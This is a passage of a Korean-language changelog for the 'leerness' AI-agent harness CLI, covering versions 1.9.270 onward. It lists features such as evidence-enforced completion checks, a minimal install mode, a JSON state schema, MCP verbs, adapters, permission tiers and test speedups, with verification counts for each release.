**🛡️ 다른 AI(Codex)가 실측한 핵심 한계 "테스트만 통과하면 미구현도 done 통과"를 보강 + 발견된 품질 버그 2건 수정.**

### 배경 (Codex 직접 테스트 결과 수렴)
Codex 가 별도 프로젝트에 설치해 평가: 메모리/인계/추적은 쓸 만하나, (1) **허위 완료 태스크가 `verify-claim --strict-claims`/`gate` 를 통과**(테스트 통과 = 구현 인정 아님), (2) `session-handoff.md` 가 evidence 코드펜스를 끌어와 **마크다운 깨짐**, (3) `--minimal` 설치인데 `status` 가 전체 기준 누락 파일을 경고(UX 혼란). 타당한 지적을 수렴.

### 구현
1. **`verify-claim --require-evidence`** (허위 완료 갭) — `_evidenceQuality()` 로 done 주장의 evidence 완전성 강제: **수정 파일 경로 + 테스트명/개수** 가 없으면 FAIL (테스트 통과만으로 불충분). Codex 의 명시 권고("evidence 에 수정 파일/테스트명/개수/로그 강제") 반영. + **정직한 한계 고지**("테스트 통과 ≠ 의미적 구현 정확성").
2. **handoff 코드펜스 sanitize** — `_sanitizeFences()`: session-handoff 임베딩 시 inner ``` → `'''` 중립화 → wrapper 펜스 균형 유지, 마크다운 안 깨짐.
3. **`status` minimal 인지** — `manifest.json` 에 `minimal` 플래그 기록 + `status` 가 minimal 설치 시 생략 파일을 missing 으로 경고 안 함 ("minimal set" 표기).
4. selftest 33→35 (evidence 완전성 + 펜스 sanitize) + e2e 231→232.

### 검증
- **selftest 35/35 PASS** · **E2E 232/232 PASS** (회귀 0) · 허위("테스트 통과함")=exit 1 차단 / 완전(파일+테스트+실제파일)=exit 0 통과 / 펜스 균형 / status "minimal set" 실측.

### Codex 평가 중 인지 (즉시 조치 외)
- 단일 대형 파일 → UR-0025 진행 중(lib/ 14종 추출). 잦은 릴리스 → dist-tag(1.9.275). e2e 시간 → handoff 회귀 수정(1.9.284) + test:fast.

## 1.9.286 — 2026-06-03 — UR-0024: 스킬 설치 영향 경량 상관추적 + HuggingFace 안내 (백로그 완전 소진)

**📊 "설치 스킬이 코딩 성능/정확도에 도움?" — 무거운 벤치 없이 기존 데이터로 정직한 상관 advisory (GPT-5.5 / 사용자 요청). 마지막 추적 백로그.**

### 배경 + 설계 판단
사용자 요청(UR-0024): 스킬 소스(HuggingFace) + 설치 영향 측정. **권고대로**: (1) 설치는 이미 존재(skill install/discover) → HF 는 모델/데이터셋 중심이라 agent-skill 가치 낮음 → **discover --github 안내만**(저우선), (2) 영향 측정은 **경량 상관추적**(인과 아님, 표본 부족 시 판단 보류)으로 honest 구현.

### 구현
1. **`leerness skill impact [--json]`** — 설치 스킬 × 사용 빈도(skill-suggestions 이력) + `review-evidence.md` 검증 통과율 상관. **정직한 advisory**: 표본<5 시 "판단 보류", 그 외 "상관추적(인과 아님)".
2. **`_parseEvidenceStats(text)` 순수 함수** — review-evidence 의 Exit code / PASS·FAIL 키워드로 통과율 집계.
3. **HuggingFace 안내** — `skill discover` 도움말에 "HF 는 모델/데이터셋 중심 → agent-skill 은 GitHub 미러 repo 를 --github 로 지정 권장".
4. **offline-first 유지** — 실제 외부 스킬 탐색은 호스트 AI, leerness 는 네트워크 자동 호출 안 함.
5. selftest 32→33 + e2e 230→231.

### 디버그 (테스트 인프라)
- `skill impact` 가 id 없는 skill 엔트리에서 `.replace` crash → `Object.entries` + 가드로 수정.
- e2e exit 127 크래시 추적 → **누적 temp 디렉토리 6409개**(세션 내 e2e 반복 실행 잔재)로 인한 OS spawn 자원 고갈 확인. 정리 후 정상(코드/CI 무관 — CI 는 fresh runner). 

### 검증
- **selftest 33/33 PASS** · **E2E 231/231 PASS** (회귀 0).

### 🎉 전체 백로그 완전 소진
GPT-5.5 1차 리뷰(UR-0025~0027) + 2차 리뷰(설치부담/모듈화/e2e) + 범용 하네스 전략(UR-0030~0035) + 사용자 요청(UR-0022~0024) — **전부 구현·배포 완료**.

## 1.9.285 — 2026-06-03 — UR-0023: 외부 OSS "빌드 vs 재사용" 결정 게이트 (오프라인)

**🔍 기능 계획 시 "이미 검증된 OSS 가 있는데 새로 만드는가?" 를 묻는 오프라인 구조적 게이트 (GPT-5.5 / 사용자 요청). 네트워크 크롤러 아님 — offline-first 유지.**

### 배경 + 설계 판단
사용자 요청(이전 라운드 기록 UR-0023): 기능 계획 시 GitHub/HuggingFace 등에 유사 OSS 존재 여부 파악 → 재사용 vs 신규. **권고대로 opt-in·offline 게이트**로 구현: leerness 는 네트워크 자동 호출 안 함(호스트 AI 가 실제 탐색), 대신 카테고리 후보 + 적합성 체크리스트를 제공해 **"재사용 검토 생략"을 방지**. 기존 `reuse`(내부 자원)와 명확히 구분.

### 구현
1. **`leerness reuse-check "<기능>"`** — 키워드→OSS 카테고리 14종(auth/http/date/validation/state/ui/markdown/cli/db/test/pdf/csv/queue/i18n/logging) 매칭 → 잘 알려진 후보 라이브러리 제시 + **6항 적합성 체크리스트**(라이선스/유지보수/보안/적합성/통합비용/제어) + 결정 템플릿. `--json`.
2. **`review-request` feature 권장 단계 통합** — feature 요청 시 1단계로 `reuse-check` 자동 안내 (게이트 자동 노출).
3. **offline 명시** — "실제 GitHub/HuggingFace 탐색은 호스트 AI 수행, leerness 는 네트워크 자동 호출 안 함".
4. selftest 31→32 + e2e 229→230.

### 검증
- **selftest 32/32 PASS** · **E2E 230/230 PASS · 301s** (회귀 0) · auth/date 카테고리 감지 + 체크리스트 + 인자 누락 exit 1 실측.

## 1.9.284 — 2026-06-03 — UR-0029: handoff 성능 회귀 수정 (10 provider 전부 spawn → 활성만) + e2e 단축

**⚡ GPT-5.5 "e2e 5분 초과" 추적 중 발견 — `handoff` 가 매번 10개 provider 의 `--version` 을 전부 spawn(≈5.5s 오버헤드). 활성(env=1) provider 만 체크하도록 수정 → handoff 7.3s → 2.6s.**

### 배경 (프로파일 기반 디버그)
GPT-5.5 가 두 번 "npm test(e2e) 5분 내 미완료" 지적. 실측 336s. `node --prof` 프로파일 결과 **handoff 시간의 90%가 `spawnSync`** — handoff 헤드라인이 `EXTERNAL_AGENTS.map(_checkAgent)` 로 **10개 provider 의 `--version` 을 매번 전부 실행**(1.9.277 provider 6→10 으로 악화). 'ready'(=활성+설치) 는 **활성(env flag=1) 일 때만** 가능하므로 비활성 provider spawn 은 순수 낭비.

### 구현
1. **handoff 헤드라인 agent 체크 — 활성 필터 선행** (bin/harness.js:7723): `EXTERNAL_AGENTS.filter(a => process.env[a.envFlag]==='1').map(_checkAgent)`. 결과 동일(비활성은 ready 불가), spawn 만 제거. **활성 0(대부분/모든 e2e) → spawn 0**.
   - 효과: handoff **7.3s → 2.6s** (회당 4.6s↓). 실사용에서도 매 handoff 5초 절감 + provider 확장 회귀 영구 해결.
2. **e2e roadmap 기본 OFF** (roadmap 전용 블록만 ON) + **총 소요시간 출력**(투명성).
3. e2e 총 **336s → 306s**. (구조적으로 133 init × ~1.1s 가 잔여 비용 — init 은 I/O 바운드.)

### 재현성 (GPT 우려 해소)
- 빠른 게이트: **`npm run test:fast`** (selftest + smoke 13종, ~10s) — 로컬/PR 즉시 검증.
- 전체 e2e: 229 케이스(subprocess 바운드 ~5min) — CI 매트릭스(ubuntu+windows × node 18/20/22) 병렬 실행으로 재현.

### 검증
- **selftest 31/31 PASS** · **E2E 229/229 PASS** (회귀 0) · handoff 활성 0 시 spawn 0 실측.

## 1.9.283 — 2026-06-03 — UR-0025 2단계: 순수 함수 추가 모듈 분리 (lib/pure-utils 7→14종)

**🧩 GPT-5.5 "1.2MB 단일 파일" 지적의 점진적·비파괴 모듈화 계속 — 최근 추가한 순수 로직을 lib/ 로 추출.**

### 구현
1. **`lib/pure-utils.js` 7 → 14 export** — 권한 등급(`PERMISSION_TIERS`/`_tierRank`/`_requiredTier`/`_policyAllows`) + dist-tag(`_resolveNpmTag`) + run 스키마(`_newRunRecord`) + mcp.json(`_mcpJsonContent`) 추가 이동. 모두 harness 내부 상태 의존 0(순수).
2. **harness.js require 재연결** — 상단 destructure 확장 + 인라인 정의 7개 제거(`module.exports` 재노출 유지). 동작 동일.
3. e2e lib 테스트 7 → 14종 export + 동작 검증. selftest 31/31 그대로(이미 해당 함수 커버).

### 검증
- **selftest 31/31 PASS** · **E2E 229/229 PASS** (회귀 0) · `npm pack` tarball lib 포함 · require 무결성(14종 함수 + PERMISSION_TIERS) 확인.

## 1.9.282 — 2026-06-03 — UR-0035: AGENTS.md(정적) vs leerness(동적) 포지셔닝 — 범용 하네스 전략 완성

**🧭 GPT-5.5 마지막 전략 항목 — leerness 는 AGENTS.md 를 대체하지 않고 보완. 정적 지침 vs 동적 상태 역할 경계 명시.**

### 배경
GPT-5.5: "AGENTS.md = 정적 프로젝트 지침, leerness = 동적 작업 상태/기억/검증/인수인계. 이 구분이 명확해야 한다 — 대체가 아니라 보완." 전략 백로그(UR-0030~0035)의 마지막.

### 구현
1. **AGENTS.md 템플릿에 "정적 vs 동적 — leerness 역할 경계" 섹션** — 모든 init/adapter 생성 AGENTS.md 상단(워크플로 직후)에 포함: 규칙/명령/금지는 AGENTS.md, 진행 상태/검증/인수인계는 `leerness state`/MCP `leerness_state_*` → `.leerness/`. "대체하지 않고 보완" 명시.
2. **README 포지셔닝 섹션(한/영)** — 정적 vs 동적 비교표 + "모든 에이전트 공통 운영 레이어".
3. selftest 30→31 + e2e 228→229.

### 검증
- **selftest 31/31 PASS** · **E2E 229/229 PASS** (회귀 0) · init AGENTS.md 경계 섹션 포함 실측.

### 🎉 범용 하네스 전략 백로그(UR-0030~0035) 완전 소진
GPT-5.5 "모든 AI 에이전트에 적용되는 범용 하네스" 방향 6항목 전부 구현:
- UR-0030 운영 레이어 정체성 · UR-0031 MCP verb · UR-0032 상태 스키마 · UR-0033 어댑터 · UR-0034 권한 등급 · **UR-0035 포지셔닝**.
- GPT 로드맵 5단계(최소 하네스/어댑터/MCP 서버/검증/권한) 충족.

## 1.9.281 — 2026-06-03 — UR-0034: 권한 등급(permission tiers) — opt-in enforced

**🛡️ GPT-5.5 "안전성 핵심" — capabilities(1.9.272 공개)를 8단계 enforced 등급으로 확장. 기본 OFF(advisory)라 기존 동작 불변.**

### 배경
GPT-5.5: "범용 하네스가 되려면 안전성이 핵심. read-only/safe-write/.../publish 등급 + 기본 보수적(위험 명령 차단)." 1.9.272 capabilities 가 표면을 *공개*만 했던 것을 *등급 기반 차단*으로 승격하되, 사용자 워크플로(릴리스 등)를 깨지 않도록 **opt-in**.

### 구현
1. **`PERMISSION_TIERS` 8등급** (위험 오름차순): read-only < safe-write < project-write < shell-read < shell-write < git-write < network < publish.
2. **`_requiredTier(cmd)` 순수 매핑** — release publish→publish, agents multi --execute/pc→shell-write, sync-main/git push→git-write, web→network, init/adapter→project-write, state/decision→safe-write, handoff/audit→read-only.
3. **`leerness policy <show|set|check>`** — `set <tier> [--enforce]`(.leerness/policy.json) · `check "<command>"` allow/deny · `show` 등급+주의명령 매핑. 기본 허용 `project-write`, enforce OFF.
4. **opt-in 차단** — `_policyEnforce()` 가 enforce ON(또는 `LEERNESS_ENFORCE_POLICY=1`) 시 허용 등급 초과 명령 차단. **`agents multi --execute`** 진입점에 게이트(기본 OFF → 동작 불변, advisory 경고만).
5. selftest 29→30 + e2e 227→228.

### 검증
- **selftest 30/30 PASS** · **E2E 228/228 PASS** (회귀 0).
- 실측: policy set read-only --enforce → `release publish` 🔴 차단 / `handoff` 🟢 허용 · enforce OFF → advisory(통과).

### 범용 하네스 로드맵 (GPT 5단계) — 거의 완성
✅ 최소 하네스(--minimal) · ✅ 어댑터(UR-0033) · ✅ MCP verb(UR-0031) · ✅ 상태 스키마(UR-0032) · ✅ **권한 등급(UR-0034)**. 남음: UR-0035 AGENTS.md(정적) vs leerness(동적) 포지셔닝.

## 1.9.280 — 2026-06-03 — UR-0033: leerness adapter <tool> — 도구별 선택 설치 + .mcp.json

**🔌 GPT-5.5 로드맵 2단계 "어댑터" — init 전체 대신 특정 도구의 지침/연결 파일만 생성. `--minimal` + `adapter` 로 침투성↓·범용성↑.**

### 배경
GPT-5.5: "leerness adapter claude/cursor/codex/goose/gemini — 각 도구별로 필요한 지침 파일만 선택 생성." 범용 하네스는 모든 에이전트 환경을 한꺼번에 심지 말고 사용자가 쓰는 도구만 연결해야 함.

### 구현
1. **`ADAPTERS` 레지스트리 9종** — claude/cursor/copilot/codex/goose/gemini/opencode/aider/qwen. 각 도구가 소유하는 파일 키(coreFiles 재사용 — 단일 출처) + MCP 지원 여부.
2. **`leerness adapter <tool> [path] [--dry-run]`** — 해당 도구의 지침 파일만 `writeIfSafe`(비파괴 mergeManaged) 로 생성. `--dry-run` 미리보기(0 변경). `adapter list` 레지스트리 표.
3. **`.mcp.json` 자동 등록** — MCP 지원 도구(claude/cursor/codex/goose/opencode)는 `.mcp.json` 에 `leerness mcp serve` 를 병합 등록(기존 mcpServers 보존) → 그 도구가 **UR-0031 상태 verb(state_show/start/record/verify/handoff)를 즉시 호출**.
4. **권장 흐름** — `leerness init . --minimal --no-env` → `leerness adapter <내 도구>` (최소 설치 + 내 에이전트만 연결).
5. selftest 28→29 + e2e 226→227.

### 검증
- **selftest 29/29 PASS** · **E2E 227/227 PASS** (회귀 0).
- 디버그: adapter 가 `--path` 만 읽어 위치 인자 path 무시 → CWD 오염 버그 발견·수정(위치 args[2] 우선) + stray 정리. 실측: `adapter cursor` → .cursor + .mcp.json, list 9종, dry-run 0파일.

## 1.9.279 — 2026-06-03 — UR-0031: 상태 substrate MCP 시맨틱 verb 노출 (모든 에이전트 공통 호출 표면)

**🔌 1.9.278 의 `.leerness/` 상태 substrate 를 MCP 도구 5종으로 노출 — Claude Code/Goose/Codex/Cursor 가 동일한 verb 로 작업 상태를 읽고 쓴다 (GPT-5.5 범용 하네스 핵심).**

### 배경
GPT-5.5: "지금처럼 '이 파일 읽어'가 아니라 leerness 가 MCP 서버로 동작해 에이전트가 직접 호출(get_context/record_decision/verify_done/make_handoff)할 수 있어야 범용성을 얻는다." 1.9.278 substrate 가 CLI 만 있었던 것을 MCP 표면으로 승격.

### 구현 (MCP 75 → 80 도구)
1. **`leerness_state_show`** — get_project_context / get_current_task (현재 run + 누적 상태 JSON).
2. **`leerness_state_start`** — start_task (goal/agent/model/task → run-NNNN 생성).
3. **`leerness_state_record`** — record_file_change / record_decision (filesChanged/commands/tests/decision 누적).
4. **`leerness_state_verify`** — request_verification / verify_done (result pass|fail).
5. **`leerness_state_handoff`** — create_handoff (summary → `.leerness/handoff/latest.{md,json}`).
- 각 MCP 도구는 `state` CLI 로 매핑(서버는 CLI shell-out 패턴 유지) → 단일 출처.

### 검증
- **selftest 28/28 PASS** · **E2E 226/226 PASS** (회귀 0).
- MCP JSON-RPC 라운드트립 실측: `tools/list` 5 verb 노출 + `state_start→record→show` (서버 재spawn 간 `.leerness/` 지속) 인수인계 확인.

### 다음 단계
- UR-0033: `leerness adapter <tool>` (도구별 .mcp.json/지침 선택 생성) · UR-0034: 권한 등급 enforced.

## 1.9.278 — 2026-06-03 — UR-0032: .leerness/ JSON 상태 스키마 (범용 하네스 substrate 1단계)

**🧱 GPT-5.5 가 최우선으로 꼽은 "상태 스키마" — 에이전트 간 구조화 인수인계 substrate. 마크다운(.harness)과 병행, 비파괴.**

### 배경
GPT-5.5: "범용 하네스가 되려면 파일 생성 도구가 아니라 프로토콜/상태 관리 도구가 돼야 한다. `.leerness/` JSON 스키마(runs/state/decisions)에 task_id/agent/model/files_changed/verification/handoff 가 있어야 Claude Code 작업을 Goose 가 이어받는다." → 전략 백로그 중 substrate 라서 **최우선** 구현.

### 구현
1. **`.leerness/` 상태 디렉토리** (신규, 비파괴 — 기존 `.harness` markdown 과 병행).
2. **`_newRunRecord()` 순수 스키마 빌더** — GPT-5.5 권고 14필드: `schemaVersion/run_id/task_id/agent_name/model_name/started_at/ended_at/goal/files_read/files_changed/commands_run/tests_run/errors/decisions/verification_result/handoff_summary/status`.
3. **`leerness state <show|start|record|verify|handoff>`** CLI (전 서브 `--json`):
   - `start "<goal>" [--agent --model --task]` → `runs/run-NNNN.json` 생성 + `state.json` currentRun 갱신
   - `record --files-changed/--commands/--tests/--decision/...` → 배열 누적(dedup)
   - `verify --result pass|fail` → verification_result + status
   - `handoff "<summary>"` → ended_at/status=handed-off + **`.leerness/handoff/latest.{md,json}`** (다음 에이전트 인수) + currentRun 해제
   - `show [--json]` → 현재 상태 + 진행 run
4. **selftest 27→28 + e2e 224→225** — 스키마 14필드 + 전체 라이프사이클(start→record→verify→handoff→show) JSON 인수인계 검증.

### 다음 단계 (전략 백로그 연계)
- UR-0031: 이 스키마를 MCP 시맨틱 verb(get_context/record_decision/verify_done/make_handoff)로 노출.
- UR-0033: `leerness adapter` 가 도구별로 이 substrate 를 가리키게.

### 검증
- **selftest 28/28 PASS** · **E2E 225/225 PASS** (회귀 0) · 라이프사이클 실측(.leerness/state·runs·handoff 생성, 다음 에이전트 JSON 인수).

## 1.9.277 — 2026-06-03 — 신규 provider 4종(opencode/qwen/aider/goose) + GPT-5.5 범용 하네스 방향 백로그 등록

**🤝 CLI 에이전트 4종을 정식 provider 로 추가 (설치 선택지 + 모델 catalog + dispatch/roles 라우팅). 빌트인 6 → 10종.**

### 신규 provider (사용자 명시)
1. **EXTERNAL_AGENTS +4** — `opencode`(오픈소스 터미널 에이전트) · `qwen`(Qwen Code) · `aider`(git-aware 페어프로그래밍) · `goose`(Block 범용 에이전트, MCP 확장). 각 `bin`/`envFlag`/`installCmd` 포함.
2. **자동 전파** — provider list(10)/cycle/setup-agents/`agents dispatch`/`roles`/`slash-commands` 가 4종 자동 흡수.
3. **install 흐름 10선택지** — 대화형 `_selectMany` + 비대화형 `1~10` 맵 확장.
4. **모델 catalog** — opencode(default/anthropic/openai) · qwen(qwen3-coder-plus/max/plus/turbo) · aider(sonnet/gpt-5/deepseek/o1-mini) · goose(default/claude/gpt).
5. **`_dispatchCommand`** — `opencode run` · `qwen -p` · `aider --message [--yes]` · `goose run -t` (모델 플래그 주입, best-effort).
6. **슬래시 레지스트리** — 4종 세션 슬래시/명령 큐레이션(opencode/qwen/aider/goose).
7. **config/nonsecret 키** — `LEERNESS_ENABLE_OPENCODE/QWEN/AIDER/GOOSE`.

### GPT-5.5 "범용 하네스 성장 방향" 판단 → 작업 스케줄 등록
GPT-5.5: leerness 는 실행 에이전트(Goose 등)와 경쟁하지 말고, 그들이 공통 의존하는 **운영 레이어(Memory+Policy+Handoff+Verification+Audit)**가 되면 범용 하네스로 성장 가능. **판단: 방향 타당 — leerness 는 이미 MCP 75도구/handoff/capabilities 로 상당 부분 정합**. 적용 항목을 백로그 등록:
- **UR-0030** 운영 레이어 정체성 포지셔닝 (실행기 경쟁 지양)
- **UR-0031** MCP 시맨틱 verb 정비 (get_context/start_task/record_decision/verify_done/make_handoff …)
- **UR-0032** `.leerness/` JSON 상태 스키마 (runs/tasks/decisions — 에이전트 간 인수인계 표준)
- **UR-0033** `leerness adapter <tool>` 도구별 선택 생성 (--minimal 확장)
- **UR-0034** 권한 등급 enforced (read-only…publish, 기본 보수적) — capabilities 확장
- **UR-0035** AGENTS.md(정적) vs leerness(동적) 역할 분리 포지셔닝

### 검증
- **selftest 27/27 PASS** · **E2E 224/224 PASS** (회귀 0) — agents list/quota 10 CLI · provider list 10.

## 1.9.276 — 2026-06-03 — 설치 부담 완화: init --dry-run / --minimal / --no-env (GPT-5.5 2차 리뷰)

**📦 GPT-5.5 2차 외부 평가(7/10)의 핵심 지적 "init이 너무 침투적 + 미리보기 부재"를 직접 해결.**

### 배경
GPT-5.5 가 1.9.275 를 직접 실행: 기능은 실용적이나 `init` 한 번에 50+ 파일 + `.claude`/`.cursor`/`.github`/`.env`/`README` 까지 건드려 "가볍게 설치"가 아님(#1). `init --dry-run` 부재(#2). `.env` 자동 생성 호불호(#6).

### 구현
1. **`init --dry-run`** — 생성/수정될 파일 목록 + 요약(생성/머지/보존 카운트) 미리보기 후 **조기 종료, 실제 변경 0**. dry 시 `_warnIfStale` 캐시 기록도 차단(부작용 0 보장). 기존 init 은 `dry:false` 하드코딩이라 미지원이던 것을 수정.
2. **`init --minimal`** — 코어 워크플로(handoff/verify/audit/session close)가 요구하지 않는 ~25개(에디터 통합 `.cursor`/`.github`, AX 가이드, 템플릿, 스킬, 특화 체크리스트 등) + `roadmap.html` + `.env` + `.claude` SessionStart hook 을 생략. **verify 필수 파일은 전부 보존** → minimal 설치도 verify 통과 (49→31 .harness 파일).
3. **`init --no-env`** — `.env`/`.env.example` 자동 생성만 생략 (토큰 자동 파일 호불호 대응).
4. **`MINIMAL_SKIP_KEYS` denylist** — verify required 목록(plan/progress/guideline/protected-files/design-system/anti-lazy/session-handoff/current-state/AGENTS)을 침범하지 않도록 설계.
5. **README/문서** — 한/영 보안 섹션에 설치 부담 완화 옵션 안내.
6. **selftest 26→27 + e2e 223→224** — minimal 필터(핵심 보존+비핵심 제외+verify 필수 보존) + dry-run(0파일)/minimal(verify 통과)/no-env(.env 제외) 통합 검증.

### 백로그 (GPT 2차 장기 항목)
- 위험 명령 별도 패키지 분리(release/pc/web), e2e 5분 내 완료 안정화, bin/harness.js 추가 모듈화(UR-0025 계속), README 첫 화면 단순화.

### 검증
- **selftest 27/27 PASS** · **E2E 224/224 PASS** (회귀 0). dry-run 실측 0 파일 생성 · minimal verify 통과 확인.

## 1.9.275 — 2026-06-03 — UR-0026: 릴리스 채널 (npm dist-tag 안정/실험)

**🚦 잦은 1.9.x 릴리스에 안정(latest)/실험(next) 채널 + 버전 고정 안내 — 사용자가 안정성을 제어 (GPT-5.5 리뷰).**

### 배경
GPT-5.5 리뷰: 릴리스가 매우 잦아 사용자가 안정/실험 버전을 구분하기 어려움(UR-0026). npm dist-tag 로 채널을 분리하고, 운영 코드는 버전 고정을 안내.

### 구현
1. **`_resolveNpmTag(explicit, env)` 순수 함수** — `--npm-tag` / `LEERNESS_NPM_TAG` / 기본 `latest`. 형식 검증(소문자/숫자/-, ≤39자), 잘못된 값은 latest 폴백.
2. **publish 경로 dist-tag 지원** — `_publishToNpm` + `release publish --npm-publish` 가 `--tag <tag>` 적용. `release sync-main --npm-tag next` 또는 `LEERNESS_NPM_TAG=next` 로 실험 채널 publish 가능 (기본은 latest 안정).
3. **`leerness release channel [--json]` 신규** — 현재 버전/기본 publish 태그/정책(latest=안정, next=실험) + 버전 고정 안내. 온라인 시 `npm view dist-tags` 회수(offline 시 생략).
4. **README 릴리스 채널 섹션(한/영)** — `npm i leerness` / `@next` / `@<버전>` 설치 가이드.
5. **selftest 25→26 + e2e 222→223** — `_resolveNpmTag` 검증 + `release channel` JSON/env 반영.

### 검증
- **selftest 26/26 PASS** · **E2E 223/223 PASS** (회귀 0). 기본 publish 채널은 latest 유지(기존 동작 불변).

## 1.9.274 — 2026-06-03 — UR-0025 1단계: bin/harness.js 모듈 분리 시작 (lib/ 순수 유틸 추출)

**🧩 단일 대형 파일(1.2MB) 모듈 분리의 비파괴 1단계 — `lib/` 모듈화 패턴 확립 + 순수 유틸 7종 추출 (GPT-5.5 리뷰).**

### 배경
GPT-5.5 리뷰: 거의 모든 기능이 `bin/harness.js` 한 파일(~20k줄)에 있어 유지보수성·리뷰 가능성이 낮음(UR-0025). 한 번에 전부 분리하면 고위험이므로, **점진적·비파괴**로 진행: 먼저 require 기반 `lib/` 모듈화 패턴을 확립하고, 부작용 0인 순수 함수부터 추출. selftest 가 추출 함수 전부를 검증하므로 회귀를 즉시 포착.

### 구현
1. **`lib/pure-utils.js` 신규** — 순수 함수 7종 추출: `_isSecretKey` / `compareVer` / `parseHarnessVersion` / `_classifyCJK` / `_riskLabel` / `_detectSystemLang` / `_parseSlashFromHelp`. harness 내부 상태·타 함수 의존 0.
2. **harness.js require 재연결** — 상단에서 `require('../lib/pure-utils')` 로 동일 이름 바인딩, 인라인 정의 제거. `module.exports` 재노출 유지(단위 테스트 호환).
3. **`package.json files` 에 `lib` 추가** — npm tarball 포함 확인(`npm pack --dry-run`: `lib/pure-utils.js` 4.6kB 포함). 미포함 시 require 실패 → 검증으로 차단.
4. **e2e +1 (221→222)** — lib 모듈 존재 + 7종 export + 동작 + files 포함 회귀 검증.

### 다음 단계 (UR-0025 계속)
- 2단계+: 모델 catalog/roles/슬래시 레지스트리 등 응집도 높은 클러스터를 순차 추출 (매 단계 selftest+e2e 녹색 유지).

### 검증
- **selftest 25/25 PASS** · **E2E 222/222 PASS** (회귀 0) · `npm pack` tarball 에 lib 포함 확인. 동작 동일(비파괴).

## 1.9.273 — 2026-06-03 — UR-0027: 빠른 테스트 서브셋 (test:fast smoke) — npm test 5분 초과 해소

**⚡ 전체 e2e(220+, 수 분) 외에 핵심-경로만 빠르게 확인하는 `npm run test:fast`(~10초) 추가 (GPT-5.5 리뷰 반영).**

### 배경
GPT-5.5 외부 리뷰에서 `npm test`(전체 e2e)가 5분 제한 안에 끝나지 않아 외부 환경에서 완료 확인이 어렵다고 지적(UR-0027). 전체 e2e 는 신뢰도(CI/릴리스 게이트)에 필요하므로 유지하되, 개발 중 빠른 피드백용 경량 smoke 를 분리.

### 구현
1. **`scripts/smoke.js` 신규** — 단일 임시 프로젝트에서 핵심 명령 13종(version/selftest/init/status/verify/handoff/audit/drift/session close/scan secrets/encoding/roles/capabilities)만 빠르게 검증. 실패 시 exit 1. **~10초** (전체 e2e 5분+ 대비).
2. **`npm run test:fast`** — `selftest + smoke.js`. README 기여 섹션에 안내.
3. **CI 빠른 잡** — `.github/workflows/ci.yml` 에 `fast`(selftest+smoke, ubuntu/node20) 잡 추가 → PR 즉시 피드백, 전체 e2e 매트릭스는 병행.
4. **e2e +1 (220→221)** — test:fast 인프라(smoke.js 존재+구문+package script) 회귀 검증.

### 검증
- **test:fast 13/13 PASS · ~10.7초** · **selftest 25/25** · **E2E 221/221 PASS** (회귀 0).

## 1.9.272 — 2026-06-03 — 공개 신뢰도·투명성 강화 (GPT-5.5 외부 리뷰 반영)

**🔒 외부 평가(GPT-5.5 직접 실행/검사, 7/10)에서 지적된 공개 패키지 신뢰도·투명성 항목을 반영.**

### 배경
GPT-5.5 가 패키지를 직접 받아 실행·검사한 외부 리뷰: 기능은 실용적이나 (1) README 배지 버전 불일치, (2) `.claude` hook 자동 설치 명시성 부족, (3) 권한이 큰 CLI(child_process/git/외부CLI/automation)인데 표면 비공개, (4) CI 공개 부재로 e2e 신뢰도, (5) 잦은 릴리스·단일 대형 파일·e2e 5분 초과를 지적. 실행 가능한 신뢰도 항목을 이번 라운드에 반영하고 나머지는 백로그(UR-0025~0027)에 기록.

### 구현
1. **`leerness capabilities` (alias `security-surface`) 신규 명령** — 권한 표면 6영역(filesystem/network/childProcess/externalAgents/automationBridges/claudeHook) + risk/opt-out + ⚠ 주의 명령 7종 공개. `--json` 기계 판독. (GPT #3 반영)
2. **`SECURITY.md` 신규** (npm `files` 포함) — 동일 표면 + 설계원칙(0-dep/no-postinstall/백업/무동의 호출금지) + 권장 도입 방식. (GPT #3)
3. **`.claude` hook 투명성** — 설치 시 "무엇을/왜/끄는 법(`--no-auto-update`, 파일 경로)" 명시 안내. (GPT #2/#4)
4. **README 버전 배지 불일치 영구 방지** — `prepack` 에 `readme sync` 추가 → 매 publish 시 배지가 현재 버전/e2e 결과와 자동 일치. ASCII 배너 버전 숫자 제거(drift-proof). (GPT #1 근본 해결)
5. **GitHub Actions CI** — `.github/workflows/ci.yml` (ubuntu+windows × node 18/20/22, selftest+e2e). 공개 CI 로 e2e 배지 신뢰도. (GPT #4)
6. **README 보안·투명성 섹션** (한/영) + selftest 24→25 + e2e 219→220.

### 백로그 기록 (GPT 장기 항목)
- UR-0025: `bin/harness.js` 단일 대형 파일 모듈 분리 (점진적·비파괴).
- UR-0026: 릴리스 채널 (npm dist-tag latest/next 안정·실험 구분).
- UR-0027: `npm test` 5분 초과 → `test:fast` 서브셋 분리 + CI 전체.

### 검증
- **selftest 25/25 PASS** · **E2E 220/220 PASS** (회귀 0).
- `capabilities --json` 6영역/주의명령/원칙 + alias 확인 · 배지 자동 동기화(1.9.272 / e2e 220) 확인.

## 1.9.271 — 2026-06-02 — README 한/영 이중 사용자 친화 재작성 (가독성) + e2e 배지 카운트 정확화

**📖 README 를 한국어/영어 이중 버전으로 가독성 좋게 재작성 (사용자 명시).**

### 배경
기존 README 는 한국어 단일(636줄)에 변경이력 덤프가 길어 가독성이 낮고, 일부 내용이 stale(gemini 표기, 배지 버전/카운트)했음. 사용자 요청: 사용 방법을 유저 친화적으로·이해하기 쉽게·한/영 버전으로·가독성 좋게.

### 구현
1. **언어 스위처 + 이중 섹션** — 상단 `🇰🇷 한국어 · 🇬🇧 English` 앵커 네비 + 명시적 `<a id>` 앵커(이모지 무관 안정). 한국어 전문 → 영어 전문 미러 구조.
2. **가독성 재구성** — "5가지 함정 → 방어" 표, 60초 시작, 작동 방식 4단계, 핵심 명령(카테고리별), FAQ, 환경변수, 최근 변경 5건 + CHANGELOG 링크. 긴 변경이력 덤프 제거(링크 대체).
3. **최신화** — gemini → agy(Antigravity)/grok 표기, 1.9.269 시스템 언어 감지·1.9.270 역할 부여 반영, 배지(version 1.9.271 / e2e 219 / selftest 24 / MCP 75 / providers 6).
4. **`syncReadme` e2e 배지 카운트 보강** — 기존 `^total++;`만 세어 177(부정확) → `run(...)` 호출(42) 포함 = **219**(실제 결과와 정확히 일치). 1.9.40 배지 자동 동기화의 정확도 개선.
5. **관리 블록 보존** — `leerness:project-readme` 마커 유지, `readme sync` 로 정합화.

### 검증
- **E2E 219/219 PASS** (readme sync + consistency check 포함) · **selftest 24/24 PASS** (회귀 0).
- 배지 자동 동기화 후 e2e 배지 = 219/219 (실제 결과 일치 확인).

## 1.9.270 — 2026-06-02 — agent roles: 모델별 역할 부여 (코딩/검수/지휘/디자인/디버그/설계/분배)

